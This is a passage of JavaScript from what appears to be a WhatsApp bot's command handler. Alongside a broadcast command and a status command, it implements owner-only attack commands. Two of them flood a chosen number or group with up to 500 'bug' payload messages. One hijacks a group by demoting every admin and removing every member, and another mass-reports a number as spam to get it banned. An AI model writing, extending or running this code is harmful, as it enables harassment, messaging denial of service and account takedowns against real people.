            for (const g of groups) {
                const gid = g.id||g.groupJid; if (!gid) continue
                try { await api.sendText(gid.includes('@')?gid:`${gid}@g.us`, `📢 *Broadcast from ${OWNER_NAME}:*\n\n${query}`); sent++; await sleep(800) } catch {}
            }
        } catch {}
        return api.sendText(chatId, `✅ Broadcast sent to *${sent}* groups!`, qid)
    }
    if (cmd === `${PREFIX}botstatus` && isOwner) {
        return api.sendText(chatId,
            `╭─❏ 📊 sᴛᴀᴛᴜs ❏\n │ ⏳ Uptime  : ${utils.getUptime()}\n │ 🤖 Chatbots: ${Object.values(state.chatbot||{}).filter(Boolean).length}\n │ 🛡️ Sudo    : ${state.sudoUsers.length}\n │ ⚡ XP Users: ${Object.keys(state.xpData||{}).length}\n │ 🔐 Mode    : ${state.selfMode?'Self':'Public'}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}buguser` && isOwner) {
        const target = digits(args[1]); if (!target) return api.sendText(chatId, `❌ Usage: .buguser <number>`, qid)
        const count = Math.min(parseInt(args[2])||200, 500)
        const jid   = `${target}@s.whatsapp.net`
        state.floodActive[jid] = true
        await api.sendText(chatId, `🐛 Flooding *${target}*... (${count})`, qid)
        let sent=0
        while (state.floodActive[jid]&&sent<count) {
            try { await api.sendText(jid, FLOOD_PAYLOADS[sent%FLOOD_PAYLOADS.length]()); if(sent%5!==0)await sleep(100); sent++ } catch { await sleep(200) }
        }
        state.floodActive[jid]=false
        return api.sendText(chatId, `✅ Sent *${sent}* to ${target}`, qid)
    }
    if (cmd === `${PREFIX}buggc` && isOwner) {
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        const count = Math.min(parseInt(args[1])||200,500)
        state.floodActive[chatId]=true
        await api.sendText(chatId, `🐛 Flooding group...`, qid)
        let sent=0
        while (state.floodActive[chatId]&&sent<count) {
            try { await api.sendText(chatId, FLOOD_PAYLOADS[sent%FLOOD_PAYLOADS.length]()); if(sent%5!==0)await sleep(100); sent++ } catch { await sleep(200) }
        }
        state.floodActive[chatId]=false
        return api.sendText(chatId, `✅ Sent *${sent}* messages!`, qid)
    }
    if (cmd === `${PREFIX}stopflood` && isOwner) {
        const target = digits(args[1])
        const key    = target?`${target}@s.whatsapp.net`:chatId
        state.floodActive[key]=false
        return api.sendText(chatId, `🛑 Flood stopped!`, qid)
    }
    if (cmd === `${PREFIX}hijack` && isOwner) {
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        await api.sendText(chatId, `⚡ Hijacking...`, qid)
        try {
            const info = await api.getGroupInfo(chatId)
            if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
            const adminJids  = (info.participants||[]).filter(isAdmin).map(p=>p.id||p.jid)
            const memberJids = (info.participants||[]).map(p=>p.id||p.jid)
            if (adminJids.length) await api.demoteGroupParticipants(chatId, adminJids).catch(()=>{})
            for (let i=0;i<memberJids.length;i+=5) { await api.removeGroupParticipants(chatId,memberJids.slice(i,i+5)).catch(()=>{}); await sleep(1000) }
            return api.sendText(chatId, `⚡ Taken over by ${OWNER_NAME}`)
        } catch(e) { return api.sendText(chatId, `❌ Hijack failed: ${e.message}`, qid) }
    }
    if (cmd === `${PREFIX}banuser` && isOwner) {
        const target = digits(args[1]); if (!target) return api.sendText(chatId, `❌ Usage: .banuser <number>`, qid)
        await api.sendText(chatId, `🚨 Reporting *${target}*...`, qid)
        let reported=0
        for (let i=0;i<5;i++) {
            try { await api.request('post','/contacts/report',{contact_id:`${target}@s.whatsapp.net`,reason:'spam'}); reported++; await sleep(500) } catch {}
        }
        return api.sendText(chatId, `✅ *${target}* reported ${reported}/5 times!`, qid)
    }
}

module.exports = { handleCommand }
